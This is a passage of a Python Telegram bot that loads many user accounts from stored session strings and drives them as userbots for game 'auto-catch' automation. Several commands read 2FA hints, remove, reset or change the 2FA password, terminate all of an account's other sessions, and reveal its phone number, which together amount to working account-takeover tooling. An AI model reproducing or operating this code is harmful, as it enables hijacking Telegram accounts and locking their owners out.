                await event.reply(f"❌ `{tu}` not online."); return
            raw = parts[2].strip() if len(parts) > 2 else ""
            if not raw and event.is_reply:
                r = await event.get_reply_message()
                if r and r.text:
                    raw = r.text.strip()
            if not raw:
                await event.reply("⚠️ No IDs."); return
            raw = raw.replace("\n", ",")
            mids = []
            for chunk in raw.split(","):
                chunk = chunk.strip()
                if not chunk:
                    continue
                if "-" in chunk:
                    rng = chunk.split("-", 1)
                    try:
                        a, b = int(rng[0].strip()), int(rng[1].strip())
                        mids.extend(range(a, b+1) if a <= b else range(b, a+1))
                    except ValueError:
                        continue
                elif chunk.isdigit():
                    mids.append(int(chunk))
            seen = set(); uniq = []
            for m in mids:
                if m not in seen:
                    seen.add(m); uniq.append(m)
            if not uniq:
                await event.reply("❌ No valid IDs."); return
            await event.reply(f"📥 Grabbing {len(uniq)} via `{tu}`...")
            asyncio.create_task(perform_grab(tu, gid, uniq, event.chat_id))

        elif cmd == "/idsave":
            if not args:
                await event.reply("⚠️ `/idsave {uid}`"); return
            try:
                tu = int(args.split()[0])
            except ValueError:
                await event.reply("❌ Invalid."); return
            if tu not in userbot_instances:
                await event.reply(f"❌ `{tu}` not online."); return
            bot_state["selected_user_id"] = tu
            await event.reply(f"✅ Selected `{tu}`. Use `/save on`.")

        elif cmd == "/save":
            if not bot_state["selected_user_id"]:
                await event.reply("⚠️ `/idsave {uid}` first."); return
            tu = bot_state["selected_user_id"]
            if args.lower() == "on":
                bot_state["save_mode"] = True
                await event.reply(f"📥 Save ON for `{tu}`.")
            elif args.lower() == "off":
                bot_state["save_mode"] = False
                doc = await cgift_ids_col.find_one({"user_id": tu})
                total = len(doc.get("ids", [])) if doc else 0
                await event.reply(f"📤 Save OFF. Total: `{total}`")
            else:
                await event.reply("⚠️ `/save on` or `/save off`")

        elif cmd == "/clean":
            if not bot_state["selected_user_id"]:
                await event.reply("⚠️ `/idsave {uid}` first."); return
            tu = bot_state["selected_user_id"]
            bot_state["save_mode"] = False
            doc = await cgift_ids_col.find_one({"user_id": tu})
            cnt = len(doc.get("ids", [])) if doc else 0
            await cgift_ids_col.delete_one({"user_id": tu})
            if tu in cgift_state:
                cgift_state[tu]["index"] = 0
                cgift_state[tu]["running"] = False
            await event.reply(f"🗑️ Cleaned {cnt} IDs for `{tu}`")

        elif cmd == "/passhint":
            if not args:
                await event.reply("⚠️ `/passhint {uid}`"); return
            try:
                tu = int(args.split()[0])
            except ValueError:
                await event.reply("❌ Invalid."); return
            if tu not in userbot_instances:
                await event.reply("❌ Not online."); return
            try:
                pwd = await userbot_instances[tu]["client"](GetPasswordRequest())
                if not pwd.has_password:
                    await event.reply(f"ℹ️ `{tu}` NO 2FA.")
                else:
                    await event.reply(f"🔐 Hint: `{pwd.hint or '(none)'}`")
            except Exception as e:
                await event.reply(f"❌ {e}")

        elif cmd == "/resetpass":
            if not args:
                await event.reply("⚠️ `/resetpass {uid}`"); return
            try:
                tu = int(args.split()[0])
            except ValueError:
                await event.reply("❌ Invalid."); return
            if tu not in userbot_instances:
                await event.reply("❌ Not online."); return
            try:
                r = await userbot_instances[tu]["client"](ResetPasswordRequest())
                rt = type(r).__name__
                if rt == "ResetPasswordOk":
                    await event.reply(f"✅ 2FA removed for `{tu}`")
                elif rt == "ResetPasswordFailedWait":
                    await event.reply(f"⏳ Wait until {r.retry_date}")
                elif rt == "ResetPasswordRequestedWait":
                    await event.reply(f"⏳ Until {r.until_date}")
                else:
                    await event.reply(f"❓ {r}")
            except Exception as e:
                await event.reply(f"❌ {e}")

        elif cmd == "/delpass":
            if not PasswordInputSettings or not InputCheckPasswordSRP:
                await event.reply("❌ 2FA types unavailable."); return
            parts = args.split(maxsplit=1)
            if len(parts) < 2:
                await event.reply("⚠️ `/delpass {uid} {password}`"); return
            try:
                tu = int(parts[0])
            except ValueError:
                await event.reply("❌ Invalid."); return
            if tu not in userbot_instances:
                await event.reply("❌ Not online."); return
            try:
                cl = userbot_instances[tu]["client"]
                pwd = await cl(GetPasswordRequest())
                if not pwd.has_password:
                    await event.reply("ℹ️ No password."); return
                chk = compute_srp_check(parts[1], pwd.current_algo, pwd.srp_B, pwd.srp_id)
                ns = PasswordInputSettings(new_algo=pwd.new_algo, new_password_hash=b'', hint="", email="")
                await cl(UpdatePasswordSettingsRequest(password=chk, new_settings=ns))
                await event.reply(f"✅ 2FA removed for `{tu}`")
            except Exception as e:
                await event.reply(f"❌ {e}")

        elif cmd == "/changepass":
            if not PasswordInputSettings or not InputCheckPasswordSRP or not InputCheckPasswordEmpty:
                await event.reply("❌ 2FA types unavailable."); return
            parts = args.split(maxsplit=2)
            if len(parts) < 3:
                await event.reply("⚠️ `/changepass {uid} {old} {new}`"); return
            try:
                tu = int(parts[0])
            except ValueError:
                await event.reply("❌ Invalid."); return
            if tu not in userbot_instances:
                await event.reply("❌ Not online."); return
            try:
                cl = userbot_instances[tu]["client"]
                pwd = await cl(GetPasswordRequest())
                if not pwd.has_password:
                    nh = new_pwd_hash(parts[2], pwd.new_algo)
                    ns = PasswordInputSettings(new_algo=pwd.new_algo, new_password_hash=nh, hint="", email="")
                    await cl(UpdatePasswordSettingsRequest(
                        password=InputCheckPasswordEmpty(), new_settings=ns))
                    await event.reply(f"✅ 2FA SET for `{tu}`")
                else:
                    chk = compute_srp_check(parts[1], pwd.current_algo, pwd.srp_B, pwd.srp_id)
                    nh = new_pwd_hash(parts[2], pwd.new_algo)
                    ns = PasswordInputSettings(new_algo=pwd.new_algo, new_password_hash=nh, hint="", email="")
                    await cl(UpdatePasswordSettingsRequest(password=chk, new_settings=ns))
                    await event.reply(f"✅ 2FA CHANGED for `{tu}`")
            except Exception as e:
                await event.reply(f"❌ {e}")

        # ---------- /addauto — direct, no delays ----------
        elif cmd == "/addauto":
            if not event.is_private:
                await event.reply("⚠️ Use in DM."); return
            parts = args.split(maxsplit=1)
            if len(parts) < 1:
                await event.reply("⚠️ `/addauto {Collection} {Session}`"); return
            col = parts[0].strip()
            session_str = parts[1].strip() if len(parts) > 1 else None
            if not session_str and event.is_reply:
                r = await event.get_reply_message()
                if r and r.text:
                    session_str = r.text.strip()
            if not session_str:
                await event.reply("❌ Session not found."); return
            await event.reply(f"⏳ Connecting into `db['{col}']`...")
            try:
                tc = TelegramClient(StringSession(session_str), APP_ID, APP_HASH)
                await tc.start()
                me = await tc.get_me()
                uid = me.id
                tc.tg_user_id = uid

                if uid in userbot_instances:
                    await event.reply(f"⚠️ `{uid}` already loaded.")
                    try:
                        await tc.disconnect()
                    except Exception:
                        pass
                    return

                default_emojis = ["🔵", "🟣", "🟡", "🟠", "💮"]
                await db[col].update_one(
                    {"user_id": uid},
                    {"$set": {
                        "user_id": uid, "session": session_str,
                        "ignored_emojis": default_emojis,
                        "is_stopped": False,
                        "limit_reached": False, "limit_resume_at": None,
                        "collection_name": col,
                    }},
                    upsert=True)
                await registry_col.update_one(
                    {"collection_name": col},
                    {"$set": {"collection_name": col}},
                    upsert=True)
                userbot_instances[uid] = {
                    "client": tc,
                    "ignored_emojis": default_emojis,
                    "is_stopped": False,
                    "limit_reached": False,
                    "limit_resume_at": None,
                    "last_limit_at": 0,
                    "collection_name": col,
                }
                register_userbot_handlers(tc)
                loaded_userbots.append({
                    "u_id": uid, "name": me.first_name or "No Name",
                    "username": me.username, "phone": me.phone,
                    "col_name": col,
                })
                await event.reply(
                    f"✅ <b>Added ({len(userbot_instances)} total)</b>\n"
                    f"👤 {make_mention(me.first_name or 'User', uid)}\n"
                    f"🆔 {code(uid)}\n"
                    f"📱 {code(me.phone or '—')}\n"
                    f"🗂️ {code('db.' + col)}\n\n"
                    f"💡 Control: <code>/acstart</code>, <code>/acstop</code>, <code>/acstatus</code> in Saved Messages.",
                    parse_mode="html")
            except Exception as e:
                await event.reply(f"❌ Connect failed: {e}")

        elif cmd == "/start":
            if not args:
                await event.reply("⚠️ `/start {uid}`"); return
            try:
                tu = int(args.split()[0])
            except ValueError:
                await event.reply("❌ Invalid."); return
            if tu in userbot_instances:
                col = userbot_instances[tu]["collection_name"]
                old = resume_tasks.pop(tu, None)
                if old and not old.done():
                    try:
                        old.cancel()
                    except Exception:
                        pass
                userbot_instances[tu]["is_stopped"] = False
                userbot_instances[tu]["limit_reached"] = False
                userbot_instances[tu]["limit_resume_at"] = None
                await db[col].update_one(
                    {"user_id": tu},
                    {"$set": {"is_stopped": False, "limit_reached": False,
                              "limit_resume_at": None}})
                await event.reply(f"🚀 `{tu}` resumed.")
            else:
                await event.reply("❌ Not found.")

        elif cmd == "/stop":
            if not args:
                await event.reply("⚠️ `/stop {uid}`"); return
            try:
                tu = int(args.split()[0])
            except ValueError:
                await event.reply("❌ Invalid."); return
            if tu in userbot_instances:
                col = userbot_instances[tu]["collection_name"]
                userbot_instances[tu]["is_stopped"] = True
                await db[col].update_one({"user_id": tu}, {"$set": {"is_stopped": True}})
                await event.reply(f"🛑 `{tu}` paused.")
            else:
                await event.reply("❌ Not found.")

        elif cmd == "/emoji":
            m = re.match(r"^(\d+)\s*(.+)$", args.strip(), re.DOTALL)
            if not m:
                await event.reply("⚠️ `/emoji {uid} {emojis}`"); return
            try:
                tu = int(m.group(1))
            except ValueError:
                await event.reply("❌ Invalid."); return
            em = [c for c in m.group(2) if not c.isspace()]
            if not em:
                await event.reply("⚠️ No emojis."); return
            if tu in userbot_instances:
                col = userbot_instances[tu]["collection_name"]
                userbot_instances[tu]["ignored_emojis"] = em
                await db[col].update_one({"user_id": tu}, {"$set": {"ignored_emojis": em}})
                await event.reply(f"✅ Ignored for `{tu}`: {' '.join(em)}")
            else:
                await event.reply("❌ Not found.")

        elif cmd == "/addhint":
            if not args:
                await event.reply("⚠️ `/addhint {bot_id}`"); return
            try:
                h = int(args.split()[0])
            except ValueError:
                await event.reply("❌ Invalid."); return
            hint_bot_ids.add(h)
            await hint_bots_col.update_one({"hint_id": h}, {"$set": {"hint_id": h}}, upsert=True)
            await event.reply(f"✅ Hint bot `{h}` added.")

        elif cmd == "/terminate":
            if not args:
                await event.reply("⚠️ `/terminate {uid}`"); return
            try:
                tu = int(args.split()[0])
            except ValueError:
                await event.reply("❌ Invalid."); return
            if tu in userbot_instances:
                try:
                    await userbot_instances[tu]["client"](functions.auth.ResetAuthorizationsRequest())
                    await event.reply(f"✅ Terminated for `{tu}`.")
                except Exception as e:
                    await event.reply(f"❌ {e}")
            else:
                await event.reply("❌ Not found.")

        elif cmd == "/phone":
            if not args:
                await event.reply("⚠️ `/phone {uid}`"); return
            try:
                tu = int(args.split()[0])
            except ValueError:
                await event.reply("❌ Invalid."); return
            if tu in userbot_instances:
                try:
                    me = await userbot_instances[tu]["client"].get_me()
                    await event.reply(
                        f"📱 <b>{code(tu)}</b>\n☎️ {code(me.phone or 'Not set')}",
                        parse_mode="html")
                except Exception as e:
                    await event.reply(f"❌ {e}")
            else:
                await event.reply("❌ Not found.")

    except Exception as e:
        print(f"❌ handle_bot_commands: {e}")
        traceback.print_exc()


# ==========================================
# 🚀 STARTUP
# ==========================================
async def startup():
    global hint_bot_ids
    print("⏳ Starting...")
    asyncio.create_task(start_dummy_web_server())
    asyncio.create_task(cleanup_loop())

    try:
        await bot.start(bot_token=BOT_TOKEN)
        print("🤖 Bot connected.")
    except Exception as e:
        print(f"❌ Bot start failed: {e}")
        return

    try:
        await bot.send_message(OWNER_ID, "🟢 **Auto-catch starting...**")
    except Exception:
        pass

    async for h_doc in hint_bots_col.find():
        h = h_doc.get("hint_id")
        if h:
            hint_bot_ids.add(h)

    await load_blacklist()
    print(f"🚫 Blacklist: {len(IGNORED_SPAWN_CHATS)} groups (catch ALL others)")

    failed = 0
    async for reg in registry_col.find():
        col = reg.get("collection_name")
        if not col:
            continue
        print(f"🗂️ Scanning db['{col}'] ...")
        async for acc in db[col].find():
            uid = acc.get("user_id")
            sess = acc.get("session")
            if not (uid and sess):
                continue
            ignored = acc.get("ignored_emojis", ["🔵", "🟣", "🟡", "🟠", "💮"])
            is_stopped = acc.get("is_stopped", False)
            limit_reached = acc.get("limit_reached", False)
            limit_resume_at = acc.get("limit_resume_at")
            last_limit_at = acc.get("last_limit_at", 0)

            if limit_reached and limit_resume_at and limit_resume_at - time.time() <= 0:
                limit_reached = False; limit_resume_at = None
                try:
                    await db[col].update_one(
                        {"user_id": uid},
                        {"$set": {"limit_reached": False, "limit_resume_at": None}})
                except Exception:
                    pass

            try:
                c = TelegramClient(StringSession(sess), APP_ID, APP_HASH)
                await c.start()
                me = await c.get_me()
                c.tg_user_id = uid
                userbot_instances[uid] = {
                    "client": c,
                    "ignored_emojis": ignored,
                    "is_stopped": is_stopped,
                    "limit_reached": limit_reached,
                    "limit_resume_at": limit_resume_at,
                    "last_limit_at": last_limit_at,
                    "collection_name": col,
                }
                register_userbot_handlers(c)
                loaded_userbots.append({
                    "u_id": uid, "name": me.first_name or "No Name",
                    "username": me.username, "phone": me.phone,
                    "col_name": col,
                })
                if limit_reached and limit_resume_at:
                    remain = limit_resume_at - time.time()
                    if remain > 0:
                        resume_tasks[uid] = asyncio.create_task(
                            resume_after(uid, remain))
                print(f"🚀 Loaded {uid} from db['{col}']")
            except Exception as e:
                failed += 1
                print(f"⚠️ [BOOT FAIL] {uid}: {type(e).__name__}: {e}")

    print(f"📊 Online: {len(userbot_instances)} | Failed: {failed}")

    try:
        summary = (
            f"🟢 <b>Startup complete</b>\n"
            f"📊 Online: {code(len(userbot_instances))}\n"
            f"❌ Failed: {code(failed)}\n"
            f"💡 Hint bots: {code(len(hint_bot_ids))}\n"
            f"🚫 Blacklist: {code(len(IGNORED_SPAWN_CHATS))} groups\n"
            f"🌐 Catching: ALL non-blacklisted\n"
            f"⏱️ Min delay: {code(MIN_CATCH_DELAY_SEC)}s + jitter\n\n"
            f"Commands:\n"
            f"• /listbots /blacklist\n"
            f"• /addblacklist -100xxx\n"
            f"• /addauto {col} {session}\n"
            f"• /clearsessions confirm"
        )
        await bot.send_message(OWNER_ID, summary, parse_mode="html")
    except Exception:
        pass

    print("🤖 Bot running...")
    await bot.run_until_disconnected()


if __name__ == '__main__':
    asyncio.run(startup())
